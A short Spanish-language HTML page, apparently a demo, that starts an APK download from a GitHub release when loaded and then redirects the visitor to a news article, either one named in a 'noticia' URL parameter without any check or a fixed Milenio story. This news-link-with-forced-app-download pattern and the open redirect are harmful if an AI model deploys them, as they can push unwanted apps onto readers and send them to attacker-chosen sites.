<!DOCTYPE html>
<html>
<head>
  <title>Descargando app...</title>
  <script>
    function startFlow() {
      const params = new URLSearchParams(window.location.search);
      const noticiaUrl = params.get("noticia");

      // iniciar descarga
      window.location.href = "https://github.com/pmezquita/demo-page/releases/download/v1.0.0/apk.apk";

      // redirigir después de unos segundos
      setTimeout(() => {
        if (noticiaUrl) {
          window.location.href = noticiaUrl;
        } else {
          window.location.href = "https://www.milenio.com/estados/rescatan-primer-trabajador-atrapado-mina-santa-fe-culiacan-sinaloa"; // fallback
        }
      }, 4000);
    }
  </script>
</head>
<body onload="startFlow()">
  <p>Tu descarga comenzará automáticamente...</p>
</body>
</html>
